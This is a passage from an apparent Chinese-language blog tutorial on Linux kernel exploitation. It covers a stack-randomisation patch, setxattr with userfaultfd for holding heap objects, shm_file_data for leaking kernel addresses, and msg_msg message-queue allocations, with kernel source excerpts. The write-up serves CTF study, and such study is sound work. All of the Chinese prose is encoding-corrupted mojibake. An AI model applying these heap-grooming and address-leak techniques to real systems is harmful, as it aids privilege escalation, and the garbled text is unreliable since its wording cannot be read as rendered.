4efd39aacb9f2..7b2542b13ebd9 100644</span></span><br><span class="line"><span class="comment">--- a/arch/x86/entry/common.c</span></span><br><span class="line"><span class="comment">+++ b/arch/x86/entry/common.c</span></span><br><span class="line"><span class="meta">@@ -38,6 +38,7 @@</span></span><br><span class="line"> #ifdef CONFIG_X86_64</span><br><span class="line"> __visible noinstr void do_syscall_64(unsigned long nr, struct pt_regs *regs)</span><br><span class="line"> &#123;</span><br><span class="line"><span class="addition">+add_random_kstack_offset();</span></span><br><span class="line"> nr = syscall_enter_from_user_mode(regs, nr);</span><br><span class="line"> </span><br><span class="line"> instrumentation_begin();</span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œè‹¥æ˜¯åœ¨è¿™ä¸ªéšæœºåç§»å€¼è¾ƒå°ä¸”æˆ‘ä»¬ä»æœ‰è¶³å¤Ÿå¤šçš„å¯„å­˜å™¨å¯ç”¨çš„æƒ…å†µä¸‹ï¼Œä»ç„¶å¯ä»¥é€šè¿‡å¸ƒç½®ä¸€äº› slide gadget æ¥ç»§ç»­å®Œæˆåˆ©ç”¨ï¼Œä¸è¿‡ç¨³å®šæ€§ä¹Ÿå¤§å¹…ä¸‹é™äº†ï¼Œ <em>å¯ä»¥è¯´è¿™ç§åˆ©ç”¨æ–¹å¼åŸºæœ¬ä¸Šæ˜¯åºŸäº†</em></p><h1 id="0x05-setxattr-ç›¸å…³"><a href="#0x05-setxattr-ç›¸å…³" class="headerlink" title="0x05.setxattr ç›¸å…³"></a>0x05.setxattr ç›¸å…³</h1><p><strong>setxattr</strong> å¹¶éä¸€ä¸ªå†…æ ¸ç»“æ„ä½“ï¼Œè€Œæ˜¯ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œä½†åœ¨ kernel pwn å½“ä¸­è¿™åŒæ ·æ˜¯ä¸€ä¸ªååˆ†æœ‰ç”¨çš„ç³»ç»Ÿè°ƒç”¨ï¼Œåˆ©ç”¨è¿™ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œå†…æ ¸ç©ºé—´ä¸­ä»»æ„å¤§å°çš„ object çš„åˆ†é…ï¼Œ<strong>é€šå¸¸éœ€è¦é…åˆ userfaultfd ç³»ç»Ÿè°ƒç”¨</strong>å®Œæˆè¿›ä¸€æ­¥çš„åˆ©ç”¨</p><h2 id="ä»»æ„å¤§å°-object-åˆ†é…ï¼ˆGFP-KERNELï¼‰-amp-é‡Šæ”¾"><a href="#ä»»æ„å¤§å°-object-åˆ†é…ï¼ˆGFP-KERNELï¼‰-amp-é‡Šæ”¾" class="headerlink" title="ä»»æ„å¤§å° object åˆ†é…ï¼ˆGFP_KERNELï¼‰&amp; é‡Šæ”¾"></a>ä»»æ„å¤§å° object åˆ†é…ï¼ˆGFP_KERNELï¼‰&amp; é‡Šæ”¾</h2><p>è§‚å¯Ÿ setxattr æºç ï¼Œå‘ç°å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SYS_setxattr()</span><br><span class="line">    path_setxattr()</span><br><span class="line">        setxattr()</span><br></pre></td></tr></table></figure><p>åœ¨ <code>setxattr()</code> å‡½æ•°ä¸­æœ‰å¦‚ä¸‹é€»è¾‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span></span><br><span class="line"><span class="title function_">setxattr</span><span class="params">(<span class="keyword">struct</span> dentry *d, <span class="type">const</span> <span class="type">char</span> __user *name, <span class="type">const</span> <span class="type">void</span> __user *value,</span></span><br><span class="line"><span class="params">     <span class="type">size_t</span> size, <span class="type">int</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">        kvalue = kvmalloc(size, GFP_KERNEL);</span><br><span class="line">        <span class="keyword">if</span> (!kvalue)</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//,..</span></span><br><span class="line"></span><br><span class="line">    kvfree(kvalue);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ value å’Œ size éƒ½æ˜¯ç”±æˆ‘ä»¬æ¥æŒ‡å®šçš„ï¼Œå³<strong>æˆ‘ä»¬å¯ä»¥åˆ†é…ä»»æ„å¤§å°çš„ object å¹¶å‘å…¶ä¸­å†™å…¥å†…å®¹</strong></p><h2 id="setxattr-userfaultfd-å †å ä½æŠ€æœ¯"><a href="#setxattr-userfaultfd-å †å ä½æŠ€æœ¯" class="headerlink" title="setxattr + userfaultfd å †å ä½æŠ€æœ¯"></a>setxattr + userfaultfd å †å ä½æŠ€æœ¯</h2><p>ä½†æ˜¯è¯¥ object åœ¨ setxattr æ‰§è¡Œç»“æŸæ—¶åˆä¼šè¢«æ”¾å› freelist ä¸­ï¼Œè®¾æƒ³è‹¥æ˜¯æˆ‘ä»¬éœ€è¦åŠ«æŒè¯¥ object çš„å‰ 8 å­—èŠ‚ï¼Œé‚£å°†å‰åŠŸå°½å¼ƒ</p><p>é‡æ–°è€ƒè™‘ setxattr çš„æ‰§è¡Œæµç¨‹ï¼Œå…¶ä¸­ä¼šè°ƒç”¨ <code>copy_from_user</code> ä»ç”¨æˆ·ç©ºé—´æ‹·è´æ•°æ®ï¼Œé‚£ä¹ˆè®©æˆ‘ä»¬è€ƒè™‘å¦‚ä¸‹åœºæ™¯ï¼š</p><p>æˆ‘ä»¬é€šè¿‡ mmap åˆ†é…è¿ç»­çš„ä¸¤ä¸ªé¡µé¢ï¼Œåœ¨ç¬¬äºŒä¸ªé¡µé¢ä¸Šå¯ç”¨ userfaultfdï¼Œå¹¶åœ¨ç¬¬ä¸€ä¸ªé¡µé¢çš„æœ«å°¾å†™å…¥æˆ‘ä»¬æƒ³è¦çš„æ•°æ®ï¼Œæ­¤æ—¶æˆ‘ä»¬è°ƒç”¨ setxattr è¿›è¡Œ<strong>è·¨é¡µé¢çš„æ‹·è´</strong>ï¼Œå½“ copy_from_user æ‹·è´åˆ°ç¬¬äºŒä¸ªé¡µé¢æ—¶<strong>ä¾¿ä¼šè§¦å‘ userfaultfdï¼Œä»è€Œè®© setxattr çš„æ‰§è¡Œæµç¨‹å¡åœ¨æ­¤å¤„ï¼Œè¿™æ ·è¿™ä¸ª object å°±ä¸ä¼šè¢«é‡Šæ”¾æ‰ï¼Œè€Œæ˜¯å¯ä»¥ç»§ç»­å‚ä¸æˆ‘ä»¬æ¥ä¸‹æ¥çš„åˆ©ç”¨</strong></p><p><img src="https://i.loli.net/2021/11/28/vBgSsTLRf5ZdYaJ.png" alt="image.png"></p><p>è¿™ä¾¿æ˜¯ setxattr + userfaultfd ç»“åˆçš„å †å ä½æŠ€æœ¯ï¼ˆä¾‹é¢˜ï¼š<a href="https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/#%E4%BE%8B%E9%A2%98%EF%BC%9ASECCON-2020-kstack">SECCON 2020 kstack</a>ï¼‰</p><h1 id="0x06-shm-file-data-ä¸å…±äº«å†…å­˜ç›¸å…³"><a href="#0x06-shm-file-data-ä¸å…±äº«å†…å­˜ç›¸å…³" class="headerlink" title="0x06.shm_file_data ä¸å…±äº«å†…å­˜ç›¸å…³"></a>0x06.shm_file_data ä¸å…±äº«å†…å­˜ç›¸å…³</h1><p><strong>è¿›ç¨‹é—´é€šä¿¡</strong>ï¼ˆInter-Process Communicationï¼ŒIPCï¼‰å³ä¸åŒè¿›ç¨‹é—´çš„æ•°æ®ä¼ é€’é—®é¢˜ï¼Œåœ¨ Linux å½“ä¸­æœ‰ä¸€ç§ IPC æŠ€æœ¯åä¸º<strong>å…±äº«å†…å­˜</strong>ï¼Œåœ¨ç”¨æˆ·æ€ä¸­æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>shmget</code>ã€<code>shmat</code>ã€<code>shmctl</code>ã€<code>shmdt</code> è¿™å››ä¸ªç³»ç»Ÿè°ƒç”¨æ“çºµå…±äº«å†…å­˜</p><h2 id="shm-file-dataï¼ˆkmalloc-32-GFP-KERNELï¼‰"><a href="#shm-file-dataï¼ˆkmalloc-32-GFP-KERNELï¼‰" class="headerlink" title="shm_file_dataï¼ˆkmalloc-32|GFP_KERNELï¼‰"></a>shm_file_dataï¼ˆkmalloc-32|GFP_KERNELï¼‰</h2><p>è¯¥ç»“æ„ä½“å®šä¹‰äº <code>/ipc/shm.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="åˆ†é…ï¼šshmat-ç³»ç»Ÿè°ƒç”¨"><a href="#åˆ†é…ï¼šshmat-ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="åˆ†é…ï¼šshmat ç³»ç»Ÿè°ƒç”¨"></a>åˆ†é…ï¼šshmat ç³»ç»Ÿè°ƒç”¨</h3><p>æˆ‘ä»¬çŸ¥é“ä½¿ç”¨ <code>shmget</code> ç³»ç»Ÿè°ƒç”¨å¯ä»¥è·å¾—ä¸€ä¸ªå…±äº«å†…å­˜å¯¹è±¡ï¼Œéšåè¦ä½¿ç”¨ <code>shmat</code> ç³»ç»Ÿè°ƒç”¨å°†å…±äº«å†…å­˜å¯¹è±¡æ˜ å°„åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œåœ¨è¯¥ç³»ç»Ÿè°ƒç”¨ä¸­è°ƒç”¨äº† <code>do_shmat()</code> å‡½æ•°ï¼Œæ³¨æ„åˆ°å¦‚ä¸‹é€»è¾‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">do_shmat</span><span class="params">(<span class="type">int</span> shmid, <span class="type">char</span> __user *shmaddr, <span class="type">int</span> shmflg,</span></span><br><span class="line"><span class="params">          ulong *raddr, <span class="type">unsigned</span> <span class="type">long</span> shmlba)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> *<span class="title">sfd</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    sfd = kzalloc(<span class="keyword">sizeof</span>(*sfd), GFP_KERNEL);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    file-&gt;private_data = sfd;</span><br></pre></td></tr></table></figure><p>å³åœ¨è°ƒç”¨ <code>shmat</code> ç³»ç»Ÿè°ƒç”¨æ—¶ä¼šåˆ›å»ºä¸€ä¸ª <code>shm_file_data</code> ç»“æ„ä½“ï¼Œæœ€åä¼šå­˜æ”¾åœ¨å…±äº«å†…å­˜å¯¹è±¡æ–‡ä»¶çš„ private_data åŸŸä¸­</p><h3 id="é‡Šæ”¾ï¼šshmdt-ç³»ç»Ÿè°ƒç”¨"><a href="#é‡Šæ”¾ï¼šshmdt-ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="é‡Šæ”¾ï¼šshmdt ç³»ç»Ÿè°ƒç”¨"></a>é‡Šæ”¾ï¼šshmdt ç³»ç»Ÿè°ƒç”¨</h3><p>æˆ‘ä»¬çŸ¥é“ä½¿ç”¨ <code>shmdt</code> ç³»ç»Ÿè°ƒç”¨ç”¨ä»¥æ–­å¼€ä¸å…±äº«å†…å­˜å¯¹è±¡çš„è¿æ¥ï¼Œè§‚å¯Ÿå…¶æºç ï¼Œå‘ç°å…¶ä¼šè°ƒç”¨ <code>ksys_shmdt()</code> å‡½æ•°ï¼Œæ³¨æ„åˆ°å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SYS_shmdt()</span><br><span class="line">    ksys_shmdt()</span><br><span class="line">        do_munmap()</span><br><span class="line">            remove_vma_list()</span><br><span class="line">                remove_vma()</span><br></pre></td></tr></table></figure><p>å…¶ä¸­æœ‰ç€è¿™æ ·ä¸€æ¡ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> vm_area_struct *<span class="title function_">remove_vma</span><span class="params">(<span class="keyword">struct</span> vm_area_struct *vma)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">next</span> =</span> vma-&gt;vm_next;</span><br><span class="line"></span><br><span class="line">    might_sleep();</span><br><span class="line">    <span class="keyword">if</span> (vma-&gt;vm_ops &amp;&amp; vma-&gt;vm_ops-&gt;close)</span><br><span class="line">        vma-&gt;vm_ops-&gt;close(vma);</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œè°ƒç”¨äº†è¯¥ vma çš„ vm_ops å¯¹åº”çš„ close å‡½æ•°ï¼Œæˆ‘ä»¬å°†ç›®å…‰é‡æ–°æ”¾å›å…±äº«å†…å­˜å¯¹åº”çš„ vma çš„åˆå§‹åŒ–çš„æµç¨‹å½“ä¸­ï¼Œåœ¨ shmat() ä¸­æ³¨æ„åˆ°å¦‚ä¸‹é€»è¾‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">do_shmat</span><span class="params">(<span class="type">int</span> shmid, <span class="type">char</span> __user *shmaddr, <span class="type">int</span> shmflg,</span></span><br><span class="line"><span class="params">          ulong *raddr, <span class="type">unsigned</span> <span class="type">long</span> shmlba)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">sfd = kzalloc(<span class="keyword">sizeof</span>(*sfd), GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!sfd) &#123;</span><br><span class="line">        fput(base);</span><br><span class="line">        <span class="keyword">goto</span> out_nattch;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    file = alloc_file_clone(base, f_flags,</span><br><span class="line">              is_file_hugepages(base) ?</span><br><span class="line">                &amp;shm_file_operations_huge :</span><br><span class="line">                &amp;shm_file_operations);</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œè°ƒç”¨äº† <code>alloc_file_clone()</code> å‡½æ•°ï¼Œå…¶ä¼šè°ƒç”¨ <code>alloc_file()</code> å‡½æ•°å°†ç¬¬ä¸‰ä¸ªå‚æ•°èµ‹å€¼ç»™æ–°çš„ file ç»“æ„ä½“çš„ f_op åŸŸï¼Œåœ¨è¿™é‡Œæ˜¯ <code>shm_file_operations</code> æˆ– <code>shm_file_operations_huge</code>ï¼Œå®šä¹‰äº <code>/ipc/shm.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">shm_file_operations</span> =</span> &#123;</span><br><span class="line">    .mmap        = shm_mmap,</span><br><span class="line">    .fsync        = shm_fsync,</span><br><span class="line">    .release    = shm_release,</span><br><span class="line">    .get_unmapped_area    = shm_get_unmapped_area,</span><br><span class="line">    .llseek        = noop_llseek,</span><br><span class="line">    .fallocate    = shm_fallocate,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * shm_file_operations_huge is now identical to shm_file_operations,</span></span><br><span class="line"><span class="comment"> * but we keep it distinct for the sake of is_file_shm_hugepages().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">shm_file_operations_huge</span> =</span> &#123;</span><br><span class="line">    .mmap        = shm_mmap,</span><br><span class="line">    .fsync        = shm_fsync,</span><br><span class="line">    .release    = shm_release,</span><br><span class="line">    .get_unmapped_area    = shm_get_unmapped_area,</span><br><span class="line">    .llseek        = noop_llseek,</span><br><span class="line">    .fallocate    = shm_fallocate,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œå¯¹äºå…³é—­ shm æ–‡ä»¶ï¼Œå¯¹åº”çš„æ˜¯ <code>shm_release</code> å‡½æ•°ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">shm_release</span><span class="params">(<span class="keyword">struct</span> inode *ino, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> *<span class="title">sfd</span> =</span> shm_file_data(file);</span><br><span class="line"></span><br><span class="line">    put_ipc_ns(sfd-&gt;ns);</span><br><span class="line">    fput(sfd-&gt;file);</span><br><span class="line">    shm_file_data(file) = <span class="literal">NULL</span>;</span><br><span class="line">    kfree(sfd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å³å½“æˆ‘ä»¬è¿›è¡Œ shmdt ç³»ç»Ÿè°ƒç”¨æ—¶ä¾¿å¯ä»¥é‡Šæ”¾ <code>shm_file_data</code> ç»“æ„ä½“</p><h3 id="æ•°æ®æ³„éœ²-2"><a href="#æ•°æ®æ³„éœ²-2" class="headerlink" title="æ•°æ®æ³„éœ²"></a>æ•°æ®æ³„éœ²</h3><h4 id="å†…æ ¸-text-æ®µåœ°å€-2"><a href="#å†…æ ¸-text-æ®µåœ°å€-2" class="headerlink" title="å†…æ ¸ .text æ®µåœ°å€"></a>å†…æ ¸ .text æ®µåœ°å€</h4><p>shm_file_data çš„ ns åŸŸ å’Œ vm_ops åŸŸçš†æŒ‡å‘å†…æ ¸çš„ .text æ®µä¸­ï¼Œè‹¥æ˜¯æˆ‘ä»¬èƒ½å¤Ÿæ³„éœ²è¿™ä¸¤ä¸ªæŒ‡é’ˆä¾¿èƒ½è·å–åˆ°å†…æ ¸ .text æ®µåŸºå€ï¼Œå…¶ä¸­ ns å­—æ®µé€šå¸¸æŒ‡å‘ <code>init_ipc_ns</code></p><h4 id="å†…æ ¸çº¿æ€§æ˜ å°„åŒºï¼ˆ-direct-mapping-areaï¼‰-1"><a href="#å†…æ ¸çº¿æ€§æ˜ å°„åŒºï¼ˆ-direct-mapping-areaï¼‰-1" class="headerlink" title="*å†…æ ¸çº¿æ€§æ˜ å°„åŒºï¼ˆ direct mapping areaï¼‰"></a><em>*å†…æ ¸çº¿æ€§æ˜ å°„åŒºï¼ˆ direct mapping areaï¼‰</em></h4><p>shm_file_data çš„ file åŸŸä¸ºä¸€ä¸ª file ç»“æ„ä½“ï¼Œä½äºçº¿æ€§æ˜ å°„åŒºä¸­ï¼Œè‹¥èƒ½æ³„éœ² file åŸŸåˆ™åŒæ ·èƒ½æ³„æ¼å‡ºå†…æ ¸çš„â€œå †ä¸Šåœ°å€â€</p><h1 id="0x07-system-V-æ¶ˆæ¯é˜Ÿåˆ—ï¼šå†…æ ¸ä¸­çš„â€œèœå•å †â€"><a href="#0x07-system-V-æ¶ˆæ¯é˜Ÿåˆ—ï¼šå†…æ ¸ä¸­çš„â€œèœå•å †â€" class="headerlink" title="0x07.system V æ¶ˆæ¯é˜Ÿåˆ—ï¼šå†…æ ¸ä¸­çš„â€œèœå•å †â€"></a>0x07.system V æ¶ˆæ¯é˜Ÿåˆ—ï¼šå†…æ ¸ä¸­çš„â€œèœå•å †â€</h1><p>åœ¨ Linux kernel ä¸­æœ‰ç€ä¸€ç»„ system V æ¶ˆæ¯é˜Ÿåˆ—ç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨ï¼š</p><ul><li>msggetï¼šåˆ›å»ºä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—</li><li>msgsndï¼šå‘æŒ‡å®šæ¶ˆæ¯é˜Ÿåˆ—å‘é€æ¶ˆæ¯</li><li>msgrcvï¼šä»æŒ‡å®šæ¶ˆæ¯é˜Ÿåˆ—æ¥æ¥æ”¶æ¶ˆæ¯</li></ul><p>å½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—æ—¶ï¼Œåœ¨å†…æ ¸ç©ºé—´ä¸­ä¼šåˆ›å»ºä¸€ä¸ª <code>msg_queue</code> ç»“æ„ä½“ï¼Œå…¶è¡¨ç¤ºä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msq_queue structure for each present queue on the system */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line"><span class="type">time64_t</span> q_stime;<span class="comment">/* last msgsnd time */</span></span><br><span class="line"><span class="type">time64_t</span> q_rtime;<span class="comment">/* last msgrcv time */</span></span><br><span class="line"><span class="type">time64_t</span> q_ctime;<span class="comment">/* last change time */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> q_cbytes;<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> q_qnum;<span class="comment">/* number of messages in queue */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> q_qbytes;<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span><span class="comment">/* pid of last msgsnd */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span><span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><h2 id="msg-msg-amp-msg-msgsegï¼šè¿‘ä¹ä»»æ„å¤§å°çš„å¯¹è±¡åˆ†é…"><a href="#msg-msg-amp-msg-msgsegï¼šè¿‘ä¹ä»»æ„å¤§å°çš„å¯¹è±¡åˆ†é…" class="headerlink" title="msg_msg &amp; msg_msgsegï¼šè¿‘ä¹ä»»æ„å¤§å°çš„å¯¹è±¡åˆ†é…"></a>msg_msg &amp; msg_msgsegï¼šè¿‘ä¹ä»»æ„å¤§å°çš„å¯¹è±¡åˆ†é…</h2><p>å½“æˆ‘ä»¬è°ƒç”¨ msgsnd ç³»ç»Ÿè°ƒç”¨åœ¨æŒ‡å®šæ¶ˆæ¯é˜Ÿåˆ—ä¸Šå‘é€ä¸€æ¡æŒ‡å®šå¤§å°çš„ message æ—¶ï¼Œåœ¨å†…æ ¸ç©ºé—´ä¸­ä¼šåˆ›å»ºè¿™æ ·ä¸€ä¸ªç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line"><span class="type">long</span> m_type;</span><br><span class="line"><span class="type">size_t</span> m_ts;<span class="comment">/* message text size */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">void</span> *security;</span><br><span class="line"><span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åœ¨å†…æ ¸å½“ä¸­è¿™ä¸¤ä¸ªç»“æ„ä½“å½¢æˆä¸€ä¸ªå¦‚ä¸‹ç»“æ„çš„å¾ªç¯åŒå‘é“¾è¡¨ï¼š</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>è‹¥æ˜¯æ¶ˆæ¯é˜Ÿåˆ—ä¸­åªæœ‰ä¸€ä¸ªæ¶ˆæ¯åˆ™æ˜¯è¿™æ ·ï¼š</p><p><img src="https://s2.loli.net/2022/02/24/sD9xtpaHrQ2uneZ.png" alt="image.png"></p><p>è™½ç„¶ <code>msg_queue</code> çš„å¤§å°åŸºæœ¬ä¸Šæ˜¯å›ºå®šçš„ï¼Œä½†æ˜¯ <code>msg_msg</code> ä½œä¸ºæ‰¿è½½æ¶ˆæ¯çš„æœ¬ä½“<strong>å…¶å¤§å°æ˜¯å¯ä»¥éšç€æ¶ˆæ¯å¤§å°çš„æ”¹å˜è€Œè¿›è¡Œå˜åŠ¨çš„</strong>ï¼Œå»é™¤æ‰ msg_msg ç»“æ„ä½“æœ¬èº«çš„ 0x30 å­—èŠ‚çš„éƒ¨åˆ†ï¼ˆæˆ–è®¸å¯ä»¥ç§°ä¹‹ä¸º headerï¼‰<strong>å‰©ä½™çš„éƒ¨åˆ†éƒ½ç”¨æ¥å­˜æ”¾ç”¨æˆ·æ•°æ®</strong>ï¼Œå› æ­¤å†…æ ¸åˆ†é…çš„ object çš„å¤§å°æ˜¯è·Ÿéšç€æˆ‘ä»¬å‘é€çš„ message çš„å¤§å°è¿›è¡Œå˜åŠ¨çš„</p><p>è€Œå½“æˆ‘ä»¬å•æ¬¡å‘é€<strong>å¤§äºã€ä¸€ä¸ªé¡µé¢å¤§å° - header sizeã€‘</strong>å¤§å°çš„æ¶ˆæ¯æ—¶ï¼Œå†…æ ¸ä¼šé¢å¤–è¡¥å……æ·»åŠ  <code>msg_msgseg</code> ç»“æ„ä½“ï¼Œå…¶ä¸ <code>msg_msg</code> 